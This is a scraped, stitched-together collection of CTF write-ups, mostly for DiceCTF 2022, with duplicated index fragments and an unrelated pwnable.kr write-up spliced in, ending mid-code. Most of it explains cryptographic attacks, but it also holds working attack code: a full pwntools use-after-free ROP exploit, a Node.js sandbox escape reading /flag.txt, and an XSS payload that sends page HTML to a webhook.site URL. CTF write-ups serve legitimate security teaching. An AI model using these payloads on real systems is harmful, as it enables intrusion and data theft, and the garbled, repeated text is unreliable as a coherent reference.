Intended solution = factor $N$ with cado-nfs, then use sage's nth_root() function to get all candidate decryptions. Finally, combine using Chinese Remainder Theorem. The nth_root() algorithm is described in this paper . It's simple for $e | p-1$, but for higher-powers of $e$ involves solving a (small) discrete logarithm problem. Fortunately, sage has it implemented as a built-in. Many resources online describe how to proceed if e | p-1 , but they don't describe the general case for higher powers of e . from Crypto.Util.number import long_to_bytes N = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971 # factor with cado-nfs p, q = 172036442175296373253148927105725488217, 337117592532677714973555912658569668821 assert p * q == N p_roots = mod(cipher, p).nth_root(e, all=True) q_roots = mod(cipher, q).nth_root(e, all=True) for xp in p_roots: for xq in q_roots: x = crt([Integer(xp), Integer(xq)], [p,q]) x = int(x) flag = long_to_bytes(x) if flag.startswith(b\"dice\"): print(flag.decode()) crypto/rejected Whenever the RNG has to reroll, then it means that the highest bit of the output is 1 . This lets you launch a known-plaintext attack on the underlying LFSR. Solve the resulting linear system (over GF(2) ) and find the flag. You don't really get much information if the RNG doesn't reroll. A good choice of modulus is (2^32 // 3) + 1 or (2^32 // 4) + 1 , as this will increase the chances of the RNG rerolling. crypto/correlated A correlation attack on a LFSR, this challenge artificially demonstrates how you can attack a filtered LFSR. If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try 1 / 0.8^48 = 45,000 different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all. Unmodified information set decoding also works, mainly because the dimension of the LFSR is so small. You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions. crypto/commitment-issues We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if m = bytes_to_long(flag) , then $s = m^d \\pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \\pmod{N}$ and $c_2 = r^5 \\pmod{N}$. There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn. Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \\in \\mathbb{Z} N[t]$ vanishes at $t = s$. We then consider the quotient ring $\\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\\mathbb{Z}_N$-module of rank $\\deg p = 5$ with basis ${1, t, ..., t^4}$. In particular any $6$ elements in $\\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\\mathbb{Z}_N$-linear dependence. Using sage to efficiently write $$(t^e)^i = a {i0} + a_{i1}t + \\dots + a_{i4}t^4 \\in \\mathbb{Z} N[t]/(p)$$ for $i = 0, ..., 5$ we can use the matrix $A = (a {ij})_{ij}$ to compute a non-trivial linear dependence $$\\beta_0 + \\beta_1 \\cdot t^e + \\dots + \\beta_5 \\cdot (t^e)^5 = 0 \\in \\mathbb{Z}_N[t]/(p).$$ However since $p(s) = 0 \\pmod{N}$, the evaluation at $s$ map $$\\begin{aligned} E_s :\\;& \\mathbb{Z}_N[t] \\to \\mathbb{Z}_N \\ & \\;\\;\\;\\; q \\longmapsto q(s) \\end{aligned}$$ descends to a valid map $\\mathbb{Z}_N[t]/(p)\\to \\mathbb{Z}_N$ and we find that in fact, $$\\beta_0 + \\beta_1 \\cdot s^e + \\dots + \\beta_5 \\cdot (s^e)^5 = 0 \\pmod{N}.$$ But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$. crypto/learning-without-errors This challenge is based on a passive attack which broke the CKKS cryptosystem last year . The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair (c_0, c_1) = (a, a * s + m + e) where s is the secret, m is the message, a is a random ring element, and e is a \"small\" secret error. If e and s are unknown, then recovering m from this requires solving a hard lattice problem. However, when decrypting, CKKS returns m + e , which just ... tells you ... what the secret error is. Basic algebra then gives s = (c_1 - (m + e)) * c_0^{-1} . Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key! However, this does seemingly require c_0 to be invertible in the ring, which for our parameters is Zmod(2^100)[x] / [x^1024] . The power-of-two modulus does (or so I thought) raise an issue. q = 1 << 100 N = 10 Rbase.<x> = PolynomialRing(Zmod(q)) R.<x> = Rbase.quotient(x^N + 1) Based on my testing, I had assumed that with overwhelming probability, c_0 would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18): A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h \u00b7 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts. My solution computes the inverse of c_0 in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial I = x^1024 + 1 has I.discriminant() = 2^10240 ). However, some teams just... got lucky... and had a c_0 which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion. The challenge still had a low number of solves, probably because RLWE is not common in CTFs. crypto/shibari This challenge implements a very weird compiler using a representation of the Braid Group . Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the proposed post-quantum (but actually completely insecure) scheme WalnutDSA . The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form. This has been proposed as a way to hide the individual factors of a product of group elements a * b * c . This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate CCNOT gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator. Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit. With all this done, we can finally discuss the challenge. The intended solution is 2 parts: 1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it. 2) apply a length-based attack because the entire circuit is reversible. if you guess that the first few gates are performing the subcircuit A := NOT bit 0; CCNOT(0,1,2) then the length of the circuit A^-1 * Circuit should be \"shorter\" than the length of Circuit , where length is the length of the LNF canonical form Whereas if you guess wrong and try the circuit B := NOT bit 0; NOT bit 1; CCNOT(0,1,2) , then the length of the circuit B^-1 * Circuit should be longer than the length of Circuit . So you can bruteforce the flag 2-bits at a time the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of LNF(a) * LNF(b) In hindsight, I should have released the LNF form of the braids so that players didn't have to import it. The only solution during the competition to this challenge used GPU brute force to find the flag \\shrug. I estimate that this took the equivalent of 10-years of cpu time. This was completely unintended. misc/undefined Node.js wraps modules in a top-level function where require is passed in as an argument, meaning that require will always be accessible from arguments . However, since arguments is shadowed, you have to first create a function then access the parent function's arguments via arguments.callee.caller.arguments : (function(){return arguments.callee.caller.arguments[1](\"fs\").readFileSync(\"/flag.txt\", \"utf8\")})() For some reason, when making the challenge, I thought import wouldn't work due to Node defaulting to common.js modules, but it does for some reason, so there's a much easier cheese: import(\"fs\").then(m=>console.log(m.readFileSync(\"/flag.txt\", \"utf8\"))) misc/sober-bishop To solve the challenge, players must find a flag which can be passed into OpenSSH's randomart algorithm. Due to the high-collision nature of the function, randomart(md5(flag)) is also provided. We need to implement a high-performance algorithm to identify valid paths through the grid. My approach was this: 1. Starting at our inital point, try moving to a diagonally adjacent position 2. Append the new position to a list of positions 3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid - If we are at the end position, go to step 5 - If it does not exceed, then try moving to a new position - If it does, then pop the current position off the list 4. Repeat steps 1-3 on the next of the four possible positions 5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array 6. Check if the randomart(md5(array)) matches the provided randomart - If not, return to step 3 - If so, we're done, and print our flag To optimise this approach: - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths - We know the start position, and the first 5 characters ( dice{ ). Therefore we can hardcode the first 21 positions - At each position, we can convert our path to a string and check if it meets the constraints (begins with dice{ , all lowercase alphanumeric). If not, we can backtrack - If we have a 'complete' flag dice{[a-z0-9]+} , we can verify that each position has been visited the correct number of times - If all this is the case, we can attempt to calculate the MD5 My Rust solution took 20 seconds to extract the flag dice{unr4nd0m} pwn/baby-rop The challenge is a simple use-after-free, but with a few mitigations to make exploitation harder. Because the challenge uses a struct with a char * , players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice. The challenge has several mitigations. 1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the __free_hook and __malloc_hook flags 2) full RELRO is used, which removes another collection of function pointers to overwrite 3) the binary uses seccomp to ban the execve syscall. So both calling a one-gadget and calling system(\"/bin/sh\") are off the table. 4) ASLR (but not PIE) is enabled, so the location of the stack is randomized. As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address. A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else can be found in this blog post . Note: these techniques were also heavily featured in the breach and containment challenges! The crucial section is that libc contains an environ pointer which points to a location on the stack. The sequence is: 1) read GOT to leak a libc address 2) read libc->environ to leak a stack address 3) compute the offset to the saved return addresses 4) ROP your way to the flag! Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were: 1) use a write syscall instead of puts() to print the flag 2) double-check that the offset between *environ and the saved return address is correct on remote (should be -0x140 ). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct 3) using .bss as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of flag.txt onto the heap were unreliable 4) open flag.txt in read-only mode. The redpwn jail we were using didn't support writing to disk 5) end your rop chain with an exit(0) syscall, which has the side-effect of flushing stdout My exploit is the following from pwn import * def split_before(s, t): i = s.index(t) return s[:i] def split_after(s, t): i = s.index(t) return s[len(t) + i:] ################################################# context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.arch = 'amd64' context.binary = \"./run\" host = args.HOST or 'localhost' port = args.PORT or 31245 if args.LOCAL: r = process(\"./run\", env = {'LD_PRELOAD' : './libc.so.6'}) else: r = remote(host, port) binary = ELF(\"./run\") libc = ELF(\"./libc.so.6\") malloc_libc_OFFSET = libc.symbols[\"malloc\"] free_libc_OFFSET = libc.symbols[\"free\"] ################################################# def xfree(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"F\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xread(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"R\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xwrite(idx, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"W\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) def xcreate(idx, length, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"C\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"How long is your safe_string: \").decode()) r.sendline(\"{}\".format(length).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) ################################################# xcreate(0, 128) xcreate(1, 128) xfree(0) xfree(1) got_free_addr = binary.symbols['got.free'] payload = p64(8) + p64(got_free_addr) xcreate(2, 16, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) free_addr = u64(s) libc_base_addr = free_addr - free_libc_OFFSET # ------------------------------------------------- got_malloc_addr = binary.symbols['got.malloc'] payload = p64(8) + p64(got_malloc_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) malloc_addr = u64(s) assert malloc_libc_OFFSET - free_libc_OFFSET == malloc_addr - free_addr # ------------------------------------------------- libc_environ_addr = libc_base_addr + libc.symbols[\"environ\"] payload = p64(8) + p64(libc_environ_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) environ_addr = u64(s) print(hex(libc_environ_addr)) print(hex(environ_addr)) # ------------------------------------------------- libc.address = libc_base_addr rop = ROP(libc) # find offset with gdb, might need some brute-force for remote rip_addr = environ_addr - 0x140 # new file descriptor, totally brute-forcible fd = 3 # pointer to filename = \"flag.txt\" dst_filename = binary.bss(400) mov_rcx_rdx_addr = libc_base_addr + 0x0016c020 # 2.34 mov_rcx_rdx = p64(mov_rcx_rdx_addr) print(disasm(libc.read(mov_rcx_rdx_addr, 4))) rop(rcx=dst_filename, rdx=u64(b\"flag.txt\")) rop.raw(mov_rcx_rdx) rop(rcx=dst_filename + 8, rdx=0) rop.raw(mov_rcx_rdx) # sanity checks rop.puts(dst_filename) rop.write(1, dst_filename, 16, 1) rop.open(dst_filename, 0) rop.read(fd, dst_filename, 128) rop.write(1, dst_filename, 128) rop.exit(0) # ------------------------------------------------- real_payload = rop.chain() payload = p64(len(real_payload)) + p64(rip_addr) xwrite(2, payload) xwrite(0, real_payload) # gdb.attach(r) r.sendline(b\"E0\") sleep(0.1) print(r.recv()) pwn/data-eater There's usually a pointer to link_map on the stack somewhere, so just write some data to buf and overwrite the DT_STRTAB pointer in link_map->l_info .

The bug here is 60 byte overflow into the 10 byte reason char array from the read() function call. ... int main(int argc, char **argv) { char reason[10]; ... read(0, reason, 70); puts(reason); } The only mitigations that are enabled are NX and ASLR. With NX enabled, we can't use shellcode. So ROP and ret2libc is our workaround. To defeat ASLR we have to do 2 passes. 1) leak the libc base address and return to main. 2) return to system() in libc.

The author writeup will be released after the first solve or the1 week is up. rev/universal This challenge presents an obfuscate quantum circuit for performing addition based on the Quantum Fourier Transform adder , which is the same addition algorithm featured in the linked writeups from last year's quantum rev challenges. The goal is to determine that number is being added. The obfuscation comes from that all of the Rz(theta) rotations have been converted into long sequences of H and T gates -- thus making the entire quantum circuit only use H, T, CNOT gates. The program I used for this was gridsynth , which is much more efficient than other approaches, eg as given by the construction of the Solovay-Kitaev theorem. No other obfuscations were applied, apart from those required to convert controlled-rotations into a mix of CNOT and single-qubit gates. $ gridsynth pi/128 SHTHTHTHTHTHTHTSHTHTHTHTSHTHTHTHTHTSHTSHTHTHTHTHTSHTHTHTSHTSHTHTSHTSHTSHTHTHTHTS HTHTHTHTHTSHTSHTHTSHTHTSHTSHTSHTSHTHTSHTSHTSHTSHTHTHTSHTSHTSHTHTHTHTSHTHTSHTHTHT SHTHTHTHTSHTHTSHTHTSHTSHTSHTHTHTHTHTHTHTSHTHTSHTHTHTSHTSHTHTHTSHTSHTSHTHTSHTHTHT HTSHTSHTSHSSSWWWWWWW The intended solution analyzes the structure of the QFT to isolate where the actual rotations are beign applied. The QFT consists of a long chain of CNOT gates and Rz rotations. The actual adder component consists of only Rz rotations, with no CNOT gates. So the longest chain of gates in the circuit which contains no CNOT gates is the adder. This is the only component which you need to statically analyze. You can determine this by reading about how the QFT works, or by looking at the generate.py script from last year's challenges. The following solution is essentially a quantum disassembler. For each single-qubit chain of H and T gates, it multiplies the gates together to determine what the quantum operator is. Then it determines that the corresponding Z-rotation angle is for this operator. Once all the rotation angles have been recovered, extracting the number being added (ie the flag) proceeds identically to quantum-rev 2 from last year . from math import pi, log2 import numpy as np # hadamard gate H = 1/np.sqrt(2)*np.array([[1, 1], [1,-1]], dtype=np.complex128) # T-phase gate T = np.array([[1, 0], [0, np.exp(1j * pi/4)]], dtype=np.complex128) # identity operator I = np.array([[1, 0], [0, 1]], dtype=np.complex128) ######################################## # num qubits n = 256 # max error epsilon = 1e-4 \"\"\" look for the start/end of the QFT.

If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try 1 / 0.8^48 = 45,000 different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all. Unmodified information set decoding also works, mainly because the dimension of the LFSR is so small. You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions.","title":"crypto/correlated"},{"location":"Writeup/DiceCTF%202022/#cryptocommitment-issues","text":"We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if m = bytes_to_long(flag) , then $s = m^d \\pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \\pmod{N}$ and $c_2 = r^5 \\pmod{N}$. There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn. Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \\in \\mathbb{Z} N[t]$ vanishes at $t = s$. We then consider the quotient ring $\\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\\mathbb{Z}_N$-module of rank $\\deg p = 5$ with basis ${1, t, ..., t^4}$. In particular any $6$ elements in $\\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\\mathbb{Z}_N$-linear dependence. Using sage to efficiently write $$(t^e)^i = a {i0} + a_{i1}t + \\dots + a_{i4}t^4 \\in \\mathbb{Z} N[t]/(p)$$ for $i = 0, ..., 5$ we can use the matrix $A = (a {ij})_{ij}$ to compute a non-trivial linear dependence $$\\beta_0 + \\beta_1 \\cdot t^e + \\dots + \\beta_5 \\cdot (t^e)^5 = 0 \\in \\mathbb{Z}_N[t]/(p).$$ However since $p(s) = 0 \\pmod{N}$, the evaluation at $s$ map $$\\begin{aligned} E_s :\\;& \\mathbb{Z}_N[t] \\to \\mathbb{Z}_N \\ & \\;\\;\\;\\; q \\longmapsto q(s) \\end{aligned}$$ descends to a valid map $\\mathbb{Z}_N[t]/(p)\\to \\mathbb{Z}_N$ and we find that in fact, $$\\beta_0 + \\beta_1 \\cdot s^e + \\dots + \\beta_5 \\cdot (s^e)^5 = 0 \\pmod{N}.$$ But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$.","title":"crypto/commitment-issues"},{"location":"Writeup/DiceCTF%202022/#cryptolearning-without-errors","text":"This challenge is based on a passive attack which broke the CKKS cryptosystem last year . The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair (c_0, c_1) = (a, a * s + m + e) where s is the secret, m is the message, a is a random ring element, and e is a \"small\" secret error. If e and s are unknown, then recovering m from this requires solving a hard lattice problem. However, when decrypting, CKKS returns m + e , which just ... tells you ... what the secret error is. Basic algebra then gives s = (c_1 - (m + e)) * c_0^{-1} . Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key! However, this does seemingly require c_0 to be invertible in the ring, which for our parameters is Zmod(2^100)[x] / [x^1024] . The power-of-two modulus does (or so I thought) raise an issue. q = 1 << 100 N = 10 Rbase.<x> = PolynomialRing(Zmod(q)) R.<x> = Rbase.quotient(x^N + 1) Based on my testing, I had assumed that with overwhelming probability, c_0 would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18): A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h \u00b7 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts. My solution computes the inverse of c_0 in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial I = x^1024 + 1 has I.discriminant() = 2^10240 ). However, some teams just... got lucky... and had a c_0 which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion. The challenge still had a low number of solves, probably because RLWE is not common in CTFs.","title":"crypto/learning-without-errors"},{"location":"Writeup/DiceCTF%202022/#cryptoshibari","text":"This challenge implements a very weird compiler using a representation of the Braid Group . Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the proposed post-quantum (but actually completely insecure) scheme WalnutDSA . The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form. This has been proposed as a way to hide the individual factors of a product of group elements a * b * c . This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate CCNOT gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator. Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit. With all this done, we can finally discuss the challenge. The intended solution is 2 parts: 1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it. 2) apply a length-based attack because the entire circuit is reversible. if you guess that the first few gates are performing the subcircuit A := NOT bit 0; CCNOT(0,1,2) then the length of the circuit A^-1 * Circuit should be \"shorter\" than the length of Circuit , where length is the length of the LNF canonical form Whereas if you guess wrong and try the circuit B := NOT bit 0; NOT bit 1; CCNOT(0,1,2) , then the length of the circuit B^-1 * Circuit should be longer than the length of Circuit . So you can bruteforce the flag 2-bits at a time the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of LNF(a) * LNF(b) In hindsight, I should have released the LNF form of the braids so that players didn't have to import it. The only solution during the competition to this challenge used GPU brute force to find the flag \\shrug. I estimate that this took the equivalent of 10-years of cpu time.

My approach was this: 1. Starting at our inital point, try moving to a diagonally adjacent position 2. Append the new position to a list of positions 3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid - If we are at the end position, go to step 5 - If it does not exceed, then try moving to a new position - If it does, then pop the current position off the list 4. Repeat steps 1-3 on the next of the four possible positions 5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array 6. Check if the randomart(md5(array)) matches the provided randomart - If not, return to step 3 - If so, we're done, and print our flag To optimise this approach: - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths - We know the start position, and the first 5 characters ( dice{ ). Therefore we can hardcode the first 21 positions - At each position, we can convert our path to a string and check if it meets the constraints (begins with dice{ , all lowercase alphanumeric).

Because the challenge uses a struct with a char * , players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice. The challenge has several mitigations. 1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the __free_hook and __malloc_hook flags 2) full RELRO is used, which removes another collection of function pointers to overwrite 3) the binary uses seccomp to ban the execve syscall. So both calling a one-gadget and calling system(\"/bin/sh\") are off the table. 4) ASLR (but not PIE) is enabled, so the location of the stack is randomized. As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address. A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else can be found in this blog post . Note: these techniques were also heavily featured in the breach and containment challenges! The crucial section is that libc contains an environ pointer which points to a location on the stack. The sequence is: 1) read GOT to leak a libc address 2) read libc->environ to leak a stack address 3) compute the offset to the saved return addresses 4) ROP your way to the flag! Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were: 1) use a write syscall instead of puts() to print the flag 2) double-check that the offset between *environ and the saved return address is correct on remote (should be -0x140 ). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct 3) using .bss as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of flag.txt onto the heap were unreliable 4) open flag.txt in read-only mode.

Looking at the source, we see that the flag is at id=0 , so we generate a token for that: > crypto.createHmac('sha256', secret).update('0').digest('hex') '7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264' Making a request to https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264 gives us the flag.","title":"web/knock-knock"},{"location":"Writeup/DiceCTF%202022/#webdicevault","text":"tl;dr use a combination of history.go(-x) and undocumented history.length xsleak to guess the location of a window and brute force flag path directory-by-directory. unintended: open vault window, redirect to your origin and get it to click vault buttons on your origin :( async function isLocation(win, url) { win.location = \"about:blank\"; await sleep(); const hlen1 = win.history.length; win.history.go(-1); await sleep(); win.location = url + \"#zzzzz\"; win.location = \"about:blank\"; await sleep(); const hlen2 = win.history.length; // reset history to initial state before running this function if (hlen1 + 1 === hlen2) { win.history.go(-2); } else if (hlen1 === hlen2) { win.history.go(-1); } return hlen1 + 1 === hlen2; }","title":"web/dicevault"},{"location":"Writeup/DiceCTF%202022/#webshadow","text":"full solution: https://shadow.mc.ax/?x=%3Cimg%20src%3D%22x%22%20onerror%3D%22find(%27steal%27)%3Bdocument.execCommand(%27insertHTML%27%2C%20false%2C%20%60%3Csvg%20onload%3D%26%2334%3Bwindow.location%3D%27https%3A%2F%2Fwebhook.site%2Fa602d76c-28a3-4e0a-8793-b183bc9bfba4%3Fa%3D%27%2BencodeURIComponent(this.parentNode.innerHTML)%26%2334%3B%3E%60)%3B%22%3E&y=-webkit-user-modify:%20read-write; css payload: -webkit-user-modify: read-write; js payload: find('steal'); document.execCommand('insertHTML', false, `<svg onload=\"window.location='https://webhook.site/a602d76c-28a3-4e0a-8793-b183bc9bfba4?a='+encodeURIComponent(this.parentNode.innerHTML)\">`); Use the obscure -webkit-user-modify property to make the div inside the shadowDOM editable then document.execCommand(\"insertHTML\",\"payload\") to write HTML inside it and get code execution inside the shadowDOM context.

I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Introduction Hey guys this is my write-up for a challenge called collision from pwnable.kr . It\u2019s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it. Challenge Description : Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) Code Analysis, Tests col.c : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } main() : Starting by the main function it checks if we have given the program an input and it checks if our input\u2019s length is exactly 20 bytes. Then it checks if the return value of check_password(our input) is equal to hashcode , if we pass that check it will read the flag, otherwise it will print wrong passcode. and exit. int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Looking up, we can see the declaration of the variable hashcode : unsigned long hashcode = 0x21DD09EC; That\u2019s a hex value, let\u2019s convert it to decimal with python : >>> 0x21DD09EC 568134124 So we need our input to be 20 bytes length and we also need to make the function check_password return 568134124 when our input is given to it. Let\u2019s quickly try to simulate that in gdb .

gef\u27a4 The return value of check_password() is saved in EAX we need it to be 568134124 : gef\u27a4 print $eax $1 = 0x46464645 gef\u27a4 set $eax=568134124 Now if we continue execution it should

[Detaching after fork from child process 3166] /bin/cat: flag: No such file or directory [Inferior 1 (process 3101) exited normally] gef\u27a4 Great, now we need to find out how to make check_password() return that value, let\u2019s look at the code. check_password() : unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } This function casts the given passcode ( p ) into integer, declares ip which is an array of pointers starting with the pointer to p , and declares an int variable called res and gives it a value of 0 then it loops 5 times through ip (because length of passcode is 20, 20/4 == 5 ) and adds each value to res , finally it returns res . In case you\u2019re confused, simply what happens is that it takes the given passcode which is 20 bytes length and divides it to 5 pieces (each piece 4 bytes) then it sums the decimal value of the 5 pieces and returns that value. For example the result of giving check_password() \u201cAAAAAAAAAAAAAAAAAAAA\u201d will be like this : \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 1094795585 + 1094795585 + 1094795585 + 1094795585 + 1094795585 res = 5473977925 To verify that I took the main code and added some printf statements, test code looks like this : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; printf(\"\\n--------------------------\\n\"); printf(\"loop : %i\\n\", i); printf(\"piece value : %i\\n\",ip[i] ); 